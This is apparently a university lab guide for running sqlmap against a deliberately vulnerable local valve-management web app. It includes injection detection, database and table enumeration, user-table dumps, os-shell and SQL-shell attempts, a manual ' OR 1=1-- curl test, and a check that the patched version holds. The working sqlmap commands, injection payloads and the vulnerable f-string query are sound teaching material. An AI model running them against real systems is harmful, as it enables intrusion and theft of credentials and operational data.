# Step 3: sqlmap Testing

**Time Required:** 3-4 hours  
**Who:** Person 1 (others observe)  
**Goal:** Use sqlmap to automatically exploit SQL injection and demonstrate role-based vulnerability

## Overview

We will use sqlmap to:
1. Test as operator (should find nothing)
2. Test as admin (should find vulnerability)
3. Enumerate databases
4. Dump user table
5. Test patched version (should find nothing)

sqlmap automates SQL injection exploitation and will provide professional tool output for your report.

## Part A: Get Fresh Session Cookies

Session cookies expire, so get fresh ones before testing.

### 1. Get Operator Session

**Firefox:**
1. Go to http://localhost:5002
2. Login as operator/operator123
3. Press F12 → Storage → Cookies
4. Copy session value

**Save it:**
```bash
echo "OPERATOR_SESSION=[paste_value_here]" > testing_results/sqlmap_outputs/cookies.txt
```

### 2. Get Admin Session

1. Logout
2. Login as admin/admin123
3. Get session cookie
4. Save it:

```bash
echo "ADMIN_SESSION=[paste_value_here]" >> testing_results/sqlmap_outputs/cookies.txt
```

### 3. Get Patched Admin Session

1. Go to http://localhost:5001
2. Login as admin/admin123
3. Get session cookie
4. Save it:

```bash
echo "PATCHED_ADMIN_SESSION=[paste_value_here]" >> testing_results/sqlmap_outputs/cookies.txt
```

## Part B: Test as Operator (Should Be Safe)

This demonstrates that the vulnerability is role-specific.

### 1. Basic Detection Test

**Command:**
```bash
sqlmap -u "http://localhost:5002/valves/search" \
  --data "search=test" \
  --cookie "session=YOUR_OPERATOR_SESSION_HERE" \
  --batch \
  --level=3 \
  --risk=2
```

**Replace:** `YOUR_OPERATOR_SESSION_HERE` with actual operator session from cookies.txt

**What this does:**
- `-u`: Target URL
- `--data`: POST parameters
- `--cookie`: Session cookie for authentication
- `--batch`: Never ask for user input (auto-mode)
- `--level=3`: Test intensity (1-5, 3 is thorough)
- `--risk=2`: Risk level (1-3, 2 includes heavier queries)

**Expected output:**
```
[INFO] testing connection to the target URL
[INFO] testing if the target URL content is stable
[INFO] target URL content is stable
[INFO] testing if POST parameter 'search' is dynamic
[INFO] POST parameter 'search' appears to be dynamic
[INFO] heuristic (basic) test shows that POST parameter 'search' might not be injectable
[INFO] testing for SQL injection on POST parameter 'search'
...
[WARNING] POST parameter 'search' does not seem to be injectable
[CRITICAL] all tested parameters do not appear to be injectable
```

**This is GOOD!** Operator account is safe (uses parameterized queries).

**Save output:**
```bash
sqlmap -u "http://localhost:5002/valves/search" \
  --data "search=test" \
  --cookie "session=YOUR_OPERATOR_SESSION_HERE" \
  --batch \
  --level=3 \
  --risk=2 \
  > testing_results/sqlmap_outputs/01_operator_test.txt 2>&1
```

**SCREENSHOT 1:** Terminal showing sqlmap operator test  
**Filename:** `29_sqlmap_operator_safe.png`

## Part C: Test as Admin (Should Find Vulnerability)

This is where the magic happens.

### 1. Initial Detection

**Command:**
```bash
sqlmap -u "http://localhost:5002/valves/search" \
  --data "search=test" \
  --cookie "session=YOUR_ADMIN_SESSION_HERE" \
  --batch \
  --level=3 \
  --risk=2
```

**Expected output:**
```
[INFO] testing connection to the target URL
[INFO] testing if the target URL content is stable
[INFO] target URL content is stable
[INFO] testing if POST parameter 'search' is dynamic
[INFO] POST parameter 'search' appears to be dynamic
[INFO] heuristic (basic) test shows that POST parameter 'search' might be injectable
[INFO] testing for SQL injection on POST parameter 'search'
[INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[INFO] testing 'Generic inline queries'
[INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[INFO] POST parameter 'search' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
POST parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of XX HTTP(s) requests:
---
Parameter: search (POST)
    Type: UNION query
    Title: Generic UNION query (NULL) - 8 columns
    Payload: search=test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- WXYZ
---
[INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
```

**This is the PROOF of vulnerability!**

**Save output:**
```bash
sqlmap -u "http://localhost:5002/valves/search" \
  --data "search=test" \
  --cookie "session=YOUR_ADMIN_SESSION_HERE" \
  --batch \
  --level=3 \
  --risk=2 \
  > testing_results/sqlmap_outputs/02_admin_detection.txt 2>&1
```

**SCREENSHOT 2:** Terminal showing sqlmap finding vulnerability  
**Filename:** `30_sqlmap_admin_vulnerable.png`

### 2. Enumerate Databases

**Command:**
```bash
sqlmap -u "http://localhost:5002/valves/search" \
  --data "search=test" \
  --cookie "session=YOUR_ADMIN_SESSION_HERE" \
  --batch \
  --dbs
```

**Expected output:**
```
available databases [1]:
[*] valves
```

**Save output:**
```bash
sqlmap -u "http://localhost:5002/valves/search" \
  --data "search=test" \
  --cookie "session=YOUR_ADMIN_SESSION_HERE" \
  --batch \
  --dbs \
  > testing_results/sqlmap_outputs/03_databases.txt 2>&1
```

**SCREENSHOT 3:** Database enumeration  
**Filename:** `31_sqlmap_databases.png`

### 3. Enumerate Tables

**Command:**
```bash
sqlmap -u "http://localhost:5002/valves/search" \
  --data "search=test" \
  --cookie "session=YOUR_ADMIN_SESSION_HERE" \
  --batch \
  -D valves \
  --tables
```

**Expected output:**
```
Database: valves
[5 tables]
+------------------+
| attack_logs      |
| command_logs     |
| scheduled_operations |
| users            |
| valves           |
+------------------+
```

**Save output:**
```bash
sqlmap -u "http://localhost:5002/valves/search" \
  --data "search=test" \
  --cookie "session=YOUR_ADMIN_SESSION_HERE" \
  --batch \
  -D valves \
  --tables \
  > testing_results/sqlmap_outputs/04_tables.txt 2>&1
```

**SCREENSHOT 4:** Table enumeration  
**Filename:** `32_sqlmap_tables.png`

### 4. Enumerate Columns in Users Table

**Command:**
```bash
sqlmap -u "http://localhost:5002/valves/search" \
  --data "search=test" \
  --cookie "session=YOUR_ADMIN_SESSION_HERE" \
  --batch \
  -D valves \
  -T users \
  --columns
```

**Expected output:**
```
Database: valves
Table: users
[7 columns]
+----------------+----------+
| Column         | Type     |
+----------------+----------+
| id             | INTEGER  |
| username       | TEXT     |
| password_hash  | TEXT     |
| role           | TEXT     |
| email          | TEXT     |
| created_at     | DATETIME |
| last_login     | DATETIME |
+----------------+----------+
```

**Save output:**
```bash
sqlmap -u "http://localhost:5002/valves/search" \
  --data "search=test" \
  --cookie "session=YOUR_ADMIN_SESSION_HERE" \
  --batch \
  -D valves \
  -T users \
  --columns \
  > testing_results/sqlmap_outputs/05_user_columns.txt 2>&1
```

**SCREENSHOT 5:** Column enumeration  
**Filename:** `33_sqlmap_columns.png`

### 5. Dump Users Table

**This is the critical data exfiltration proof.**

**Command:**
```bash
sqlmap -u "http://localhost:5002/valves/search" \
  --data "search=test" \
  --cookie "session=YOUR_ADMIN_SESSION_HERE" \
  --batch \
  -D valves \
  -T users \
  --dump
```

**Expected output:**
```
Database: valves
Table: users
[4 entries]
+----+----------+-------------+--------------------------------------+-----------------------------+-------------------------+
| id | role     | username    | email                                | password_hash               | created_at              |
+----+----------+-------------+--------------------------------------+-----------------------------+-------------------------+
| 1  | admin    | admin       | admin@valvemanagement.local          | pbkdf2:sha256:600000$...   | 2024-01-01 00:00:00     |
| 2  | operator | operator1   | operator1@valvemanagement.local      | pbkdf2:sha256:600000$...   | 2024-01-01 00:00:00     |
| 3  | operator | operator2   | operator2@valvemanagement.local      | pbkdf2:sha256:600000$...   | 2024-01-01 00:00:00     |
| 4  | viewer   | viewer1     | viewer1@valvemanagement.local        | pbkdf2:sha256:600000$...   | 2024-01-01 00:00:00     |
+----+----------+-------------+--------------------------------------+-----------------------------+-------------------------+
```

**This shows complete data exfiltration - usernames, emails, password hashes!**

sqlmap will also save this to CSV:
```
[INFO] table 'valves.users' dumped to CSV file '/Users/[username]/.local/share/sqlmap/output/localhost/dump/valves/users.csv'
```

**Save output:**
```bash
sqlmap -u "http://localhost:5002/valves/search" \
  --data "search=test" \
  --cookie "session=YOUR_ADMIN_SESSION_HERE" \
  --batch \
  -D valves \
  -T users \
  --dump \
  > testing_results/sqlmap_outputs/06_users_dump.txt 2>&1
```

**Copy the CSV file:**
```bash
find ~/.local/share/sqlmap -name "users.csv" -exec cp {} testing_results/sqlmap_outputs/users_dumped.csv \;
```

**SCREENSHOT 6:** Users table dump  
**Filename:** `34_sqlmap_users_dump.png`

### 6. Dump Other Interesting Tables

**Dump valves table:**
```bash
sqlmap -u "http://localhost:5002/valves/search" \
  --data "search=test" \
  --cookie "session=YOUR_ADMIN_SESSION_HERE" \
  --batch \
  -D valves \
  -T valves \
  --dump \
  --threads 5 \
  > testing_results/sqlmap_outputs/07_valves_dump.txt 2>&1
```

**Dump command_logs:**
```bash
sqlmap -u "http://localhost:5002/valves/search" \
  --data "search=test" \
  --cookie "session=YOUR_ADMIN_SESSION_HERE" \
  --batch \
  -D valves \
  -T command_logs \
  --dump \
  > testing_results/sqlmap_outputs/08_logs_dump.txt 2>&1
```

**SCREENSHOT 7:** Additional data exfiltration  
**Filename:** `35_sqlmap_full_dump.png`

## Part D: Test Patched Version (Should Be Safe)

This demonstrates that the fix works.

### 1. Test Patched as Admin

**Command:**
```bash
sqlmap -u "http://localhost:5001/valves/search" \
  --data "search=test" \
  --cookie "session=YOUR_PATCHED_ADMIN_SESSION_HERE" \
  --batch \
  --level=5 \
  --risk=3
```

**Note:** Using level=5 and risk=3 for maximum thoroughness to prove it's secure.

**Expected output:**
```
[INFO] testing connection to the target URL
[INFO] testing if the target URL content is stable
[INFO] target URL content is stable
[INFO] testing if POST parameter 'search' is dynamic
[INFO] POST parameter 'search' appears to be dynamic
[INFO] heuristic (basic) test shows that POST parameter 'search' might not be injectable
[INFO] testing for SQL injection on POST parameter 'search'
...
[WARNING] POST parameter 'search' does not seem to be injectable
[CRITICAL] all tested parameters do not appear to be injectable
```

**This proves the patch works!**

**Save output:**
```bash
sqlmap -u "http://localhost:5001/valves/search" \
  --data "search=test" \
  --cookie "session=YOUR_PATCHED_ADMIN_SESSION_HERE" \
  --batch \
  --level=5 \
  --risk=3 \
  > testing_results/sqlmap_outputs/09_patched_test.txt 2>&1
```

**SCREENSHOT 8:** Patched version not injectable  
**Filename:** `36_sqlmap_patched_safe.png`

## Part E: Advanced sqlmap Features

### 1. OS Shell Attempt (Will Fail - But Good to Show)

**Command:**
```bash
sqlmap -u "http://localhost:5002/valves/search" \
  --data "search=test" \
  --cookie "session=YOUR_ADMIN_SESSION_HERE" \
  --batch \
  --os-shell
```

**Expected:** Will fail (SQLite doesn't support xp_cmdshell or similar)

**But shows:** The severity - if this was MySQL/MSSQL, attacker could get shell

**Save output:**
```bash
sqlmap -u "http://localhost:5002/valves/search" \
  --data "search=test" \
  --cookie "session=YOUR_ADMIN_SESSION_HERE" \
  --batch \
  --os-shell \
  > testing_results/sqlmap_outputs/10_os_shell_attempt.txt 2>&1
```

### 2. SQL Shell (Interactive Queries)

**Command:**
```bash
sqlmap -u "http://localhost:5002/valves/search" \
  --data "search=test" \
  --cookie "session=YOUR_ADMIN_SESSION_HERE" \
  --batch \
  --sql-shell
```

**This gives you SQL prompt:** `sql-shell>`

**Try queries:**
```sql
SELECT COUNT(*) FROM users;
SELECT username, role FROM users;
SELECT * FROM valves LIMIT 5;
```

Type `quit` to exit.

**SCREENSHOT 9:** SQL shell interaction  
**Filename:** `37_sqlmap_sql_shell.png`

## Part F: Create Summary Document

Create a summary of findings:

**File:** `testing_results/sqlmap_outputs/SQLMAP_SUMMARY.md`

**Content:**
```markdown
# sqlmap Testing Summary - CS437 Task 5

## Test Date
[Insert Date]

## Test Environment
- Target: http://localhost:5002/valves/search
- Tool: sqlmap 1.x.x
- Parameter: search (POST)

## Test Results

### 1. Operator Account Test
**Result:** NOT VULNERABLE ✅
- Account: operator1
- Finding: All tests returned "not injectable"
- Reason: Application uses parameterized queries for operator role

### 2. Admin Account Test
**Result:** VULNERABLE ⚠️
- Account: admin
- Finding: UNION-based SQL injection detected
- Injection Type: Generic UNION query (NULL) - 8 columns
- Backend DBMS: SQLite

### 3. Data Exfiltration
**Successfully extracted:**
- Database name: valves
- 5 tables: users, valves, command_logs, attack_logs, scheduled_operations
- Complete users table (4 records)
  - Usernames
  - Password hashes
  - Email addresses
  - Roles
- Complete valves table (150 records)
- Command logs

### 4. Patched Version Test
**Result:** NOT VULNERABLE ✅
- Tested with level=5, risk=3 (maximum thoroughness)
- All parameters returned "not injectable"
- Fix verified: Parameterized queries for all roles

## Impact Assessment

**Confidentiality:** HIGH
- All user credentials exposed
- All valve configurations exposed
- Complete operational data accessible

**Integrity:** HIGH
- Potential for data modification (UPDATE queries)
- Could change valve states maliciously

**Availability:** MEDIUM
- Could drop tables
- Could corrupt database

**OT-Specific Impact:**
- Attacker can view all valve configurations
- Could identify critical infrastructure targets
- Could exfiltrate operational patterns
- Could plan physical attacks based on valve schedules

## Root Cause

**Vulnerable code (admin):**
```python
query = f"SELECT * FROM valves WHERE valve_name LIKE '%{search_term}%'"
```

**Safe code (operator):**
```python
query = "SELECT * FROM valves WHERE valve_name LIKE ? OR location LIKE ?"
valves_raw = conn.execute(query, (f'%{search_term}%', f'%{search_term}%')).fetchall()
```

**The Fix:**
Use parameterized queries for ALL users regardless of role.

## Tool Output Files
1. 01_operator_test.txt - Operator safe test
2. 02_admin_detection.txt - Initial vulnerability detection
3. 03_databases.txt - Database enumeration
4. 04_tables.txt - Table listing
5. 05_user_columns.txt - Users table structure
6. 06_users_dump.txt - Complete users table dump
7. 07_valves_dump.txt - Complete valves data
8. 08_logs_dump.txt - Command logs
9. 09_patched_test.txt - Patched version verification
10. 10_os_shell_attempt.txt - OS shell attempt (failed)
11. users_dumped.csv - Users data in CSV format

## Screenshots
- 29_sqlmap_operator_safe.png
- 30_sqlmap_admin_vulnerable.png
- 31_sqlmap_databases.png
- 32_sqlmap_tables.png
- 33_sqlmap_columns.png
- 34_sqlmap_users_dump.png
- 35_sqlmap_full_dump.png
- 36_sqlmap_patched_safe.png
- 37_sqlmap_sql_shell.png

## Conclusions

1. **Vulnerability confirmed:** Role-based SQL injection exists
2. **Exploitability:** HIGH - Full database access with sqlmap
3. **Stealth:** LOW - All attempts logged in monitoring dashboard
4. **Patch effectiveness:** VERIFIED - Patched version not vulnerable
5. **Testing missed it:** Operator testing didn't catch it (by design)
```

Save this file.

## Troubleshooting

**"sqlmap not found":**
```bash
pip3 install sqlmap-tool
# or
python3 -m pip install sqlmap-tool
```

**"Target connection timeout":**
- Verify app is running: `docker ps`
- Check URL is correct
- Try: `curl http://localhost:5002/valves/search -d "search=test"`

**"Session cookie invalid":**
- Get fresh cookie (they expire)
- Make sure you're logged in before getting cookie
- Don't include "session=" in the cookie value (just the value)

**"sqlmap hangs":**
- Press Ctrl+C to stop
- Add `--threads=1` to slow it down
- Check app logs: `docker-compose logs vulnerable_app`

**"Cannot find vulnerability as admin":**
- Verify you're using ADMIN session (not operator)
- Check session is still valid (login again)
- Try manual test first:
```bash
curl -X POST http://localhost:5002/valves/search \
  -d "search=' OR 1=1--" \
  -H "Cookie: session=YOUR_ADMIN_SESSION"
```

**"CSV file not created":**
- sqlmap saves to: `~/.local/share/sqlmap/output/localhost/dump/`
- Or: `~/.sqlmap/output/localhost/dump/`
- Search for it: `find ~ -name "users.csv" 2>/dev/null`

## Summary Checklist

After completing sqlmap testing, verify:

- [ ] Operator test completed (not vulnerable)
- [ ] Admin test completed (vulnerable)
- [ ] Database enumerated
- [ ] Tables listed
- [ ] Users table dumped
- [ ] Additional tables dumped
- [ ] Patched version tested (not vulnerable)
- [ ] 10 output files saved
- [ ] 9 screenshots captured
- [ ] CSV dump file copied
- [ ] SQLMAP_SUMMARY.md created

## Next Steps

**Once sqlmap testing complete:**
→ **04_MANUAL_TESTING.md**

**Estimated time for next step:** 2 hours
